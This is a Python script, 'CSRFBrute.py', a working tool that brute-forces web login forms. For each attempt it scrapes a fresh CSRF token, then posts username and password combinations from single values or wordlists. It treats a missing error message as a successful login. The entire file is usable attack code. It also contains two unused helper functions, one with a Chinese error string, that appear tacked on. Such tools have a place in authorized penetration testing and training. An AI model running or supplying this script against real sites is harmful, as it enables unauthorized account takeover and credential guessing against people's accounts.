#!/usr/bin/env python3

import argparse
import sys
import re

import requests
from bs4 import BeautifulSoup


def getToken(url, csrfname, request):
    page = request.get(url)
    html_content = page.text
    soup = BeautifulSoup(html_content, features="lxml")

    token_input = soup.find("input", {"name": csrfname})

    if not token_input:
        print("[-] CSRF token input with name '{}' not found.".format(csrfname))
        sys.exit(1)

    token = token_input.get("value")

    if token is None:
        print(
            "[-] CSRF token input with name '{}' found, but it has no 'value' attribute.".format(
                csrfname
            )
        )
        sys.exit(1)

    return token


def connect(username, password, url, csrfname, token, message, request):
    login_info = {
        "useralias": username,
        "password": password,
        "submitLogin": "Connect",
        csrfname: token,
    }

    login_request = request.post(url, login_info)

    if message not in login_request.text:
        return True

    else:
        return False


def tryLogin(username, password, url, csrfname, message, request):
    print("[+] Trying " + username + ":" + password + " combination")
    print("[+] Retrieving CSRF token to submit the login form")
    token = getToken(url, csrfname, request)

    print("[+] Login token is : {0}".format(token))

    found = connect(username, password, url, csrfname, token, message, request)

    if not found:
        print("[-] Wrong credentials")
        return False
    else:
        print("[+] Logged in sucessfully")
        return True


def printSuccess(username, password):
    print("-------------------------------------------------------------")
    print()
    print("[*] Credentials:\t" + username + ":" + password)
    print()


def safe_input(val, maxlen=128):
    if not isinstance(val, str) or len(val) > maxlen:
        raise ValueError("输入不合法")
    return val


def mask_sensitive(msg):
    if not isinstance(msg, str):
        return msg
    return re.sub(r'(password|token|cookie|secret|key)=\S+', r'\1=***', msg, flags=re.I)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    # usernames can be one or more in a wordlist, but this two ptions are mutual exclusive
    user_group = parser.add_mutually_exclusive_group(required=True)
    user_group.add_argument("-l", "--username", help="username for bruteforce login")
    user_group.add_argument(
        "-L", "--usernames", help="usernames worldlist for bruteforce login"
    )

    # passwords can be one or more in a wordlist, but this two ptions are mutual exclusive
    pass_group = parser.add_mutually_exclusive_group(required=True)
    pass_group.add_argument("-p", "--password", help="password for bruteforce login")
    pass_group.add_argument(
        "-P", "--passwords", help="passwords wordlist for bruteforce login"
    )

    # url
    parser.add_argument("-u", "--url", help="Url with login form", required=True)

    # csrf
    parser.add_argument(
        "-c", "--csrfname", help="The csrf token input name on the login", required=True
    )

    # error message
    parser.add_argument(
        "-m",
        "--message",
        help="The message of invalid cretials in the page after submit",
        required=True,
    )

    # verbosity
    parser.add_argument("-v", "--verbosity", action="count", help="verbosity level")

    args = parser.parse_args()

    print(
        """
	##########################################
	|	* Welcome to CSRFBrute.py     	 |
	##########################################
	"""
    )

    # one username and one password
    if args.username and args.password:
        reqSess = requests.session()

        if args.verbosity != None:
            found = tryLogin(
                args.username,
                args.password,
                args.url,
                args.csrfname,
                args.message,
                reqSess,
            )
            print()
        else:
            token = getToken(args.url, args.csrfname, reqSess)
            found = connect(
                args.username,
                args.password,
                args.url,
                args.csrfname,
                token,
                args.message,
                reqSess,
            )

        if found:
            printSuccess(args.username, args.password)
            sys.exit(0)

    # one username and more passwords
    elif args.username and args.passwords:
        try:
            with open(args.passwords, "rb") as passfile:
                passwords = [p.decode().strip() for p in passfile.readlines()]
        except FileNotFoundError:
            print("[-] Error: Passwords file not found at '{}'".format(args.passwords))
            sys.exit(1)

        for passwd in passwords:
            reqSess = requests.session()

            if args.verbosity != None:
                found = tryLogin(
                    args.username,
                    passwd,
                    args.url,
                    args.csrfname,
                    args.message,
                    reqSess,
                )
                print()
            else:
                token = getToken(args.url, args.csrfname, reqSess)
                found = connect(
                    args.username,
                    passwd,
                    args.url,
                    args.csrfname,
                    token,
                    args.message,
                    reqSess,
                )

            if found:
                printSuccess(args.username, passwd)
                sys.exit(0)

    # more usernames and one password
    elif args.usernames and args.password:
        try:
            with open(args.usernames, "rb") as userfile:
                users = [u.decode().strip() for u in userfile.readlines()]
        except FileNotFoundError:
            print("[-] Error: Usernames file not found at '{}'".format(args.usernames))
            sys.exit(1)

        for user in users:
            reqSess = requests.session()

            if args.verbosity != None:
                found = tryLogin(
                    user, args.password, args.url, args.csrfname, args.message, reqSess
                )
                print()
            else:
                token = getToken(args.url, args.csrfname, reqSess)
                found = connect(
                    user,
                    args.password,
                    args.url,
                    args.csrfname,
                    token,
                    args.message,
                    reqSess,
                )

            if found:
                printSuccess(user, args.password)
                sys.exit(0)

    # more usernames and more passwords
    elif args.usernames and args.passwords:
        try:
            with open(args.usernames, "rb") as userfile:
                users = [u.decode().strip() for u in userfile.readlines()]
            with open(args.passwords, "rb") as passfile:
                passwords = [p.decode().strip() for p in passfile.readlines()]
        except FileNotFoundError as e:
            if e.filename == args.usernames:
                print(
                    "[-] Error: Usernames file not found at '{}'".format(args.usernames)
                )
            else:
                print(
                    "[-] Error: Passwords file not found at '{}'".format(args.passwords)
                )
            sys.exit(1)

        for user in users:
            for passwd in passwords:
                reqSess = requests.session()

                if args.verbosity != None:
                    found = tryLogin(
                        user, passwd, args.url, args.csrfname, args.message, reqSess
                    )
                    print()
                else:
                    token = getToken(args.url, args.csrfname, reqSess)
                    found = connect(
                        user,
                        passwd,
                        args.url,
                        args.csrfname,
                        token,
                        args.message,
                        reqSess,
                    )

                if found:
                    printSuccess(user, passwd)
                    sys.exit(0)
